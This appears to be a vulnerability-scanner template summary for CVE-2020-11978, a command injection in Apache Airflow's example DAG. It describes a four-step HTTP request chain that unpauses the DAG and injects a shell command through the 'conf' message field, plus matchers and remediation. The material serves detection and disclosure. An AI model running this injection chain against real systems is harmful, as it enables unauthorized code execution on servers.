---
cve_id: CVE-2020-11978
template_path: nuclei-templates/http/cves/2020/CVE-2020-11978.yaml
affected_product: Apache Airflow
severity: high
authentication: required
external_callback: false
affected_versions: <=1.10.10
preconditions: example DAGs enabled (load_examples=True)
poc_classification: rce
---

## Vulnerability
Apache Airflow <=1.10.10 contains a remote code execution vulnerability (CWE-78) via OS command injection inside the `example_trigger_target_dag` example DAG shipped by default. Any authenticated user can trigger arbitrary commands executed as the Airflow worker or scheduler process (depending on the executor).  
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (8.8).  
Impact: arbitrary code execution on the server.  
Remediation: set `load_examples=False` in airflow.cfg.

## PoC / Detection
Classification: rce

The template executes a four-step raw HTTP workflow against the experimental API:  
1. GET /api/experimental/test  
2. GET /api/experimental/dags/example_trigger_target_dag/paused/false (unpause)  
3. POST /api/experimental/dags/example_trigger_target_dag/dag_runs with `{"conf": {"message": "\"; touch test #"}}` (command injection payload)  
4. GET /api/experimental/dags/example_trigger_target_dag/dag_runs/{{exec_date}}/tasks/bash_task  

Matchers verify `contains(body_4, "operator":"BashOperator")` and JSON content-type, confirming the BashOperator task executed and the injection point is reachable. The payload actively creates a file (`touch test`) on vulnerable instances.

## References
- https://github.com/pberba/CVE-2020-11978
- https://twitter.com/wugeej/status/1400336603604668418
- https://lists.apache.org/thread.html/r7255cf0be3566f23a768e2a04b40fb09e52fcd1872695428ba9afe91%40%3Cusers.airflow.apache.org%3E
- https://nvd.nist.gov/vuln/detail/CVE-2020-11978
- http://packetstormsecurity.com/files/174764/Apache-Airflow-1.10.10-Remote-Code-Execution.html
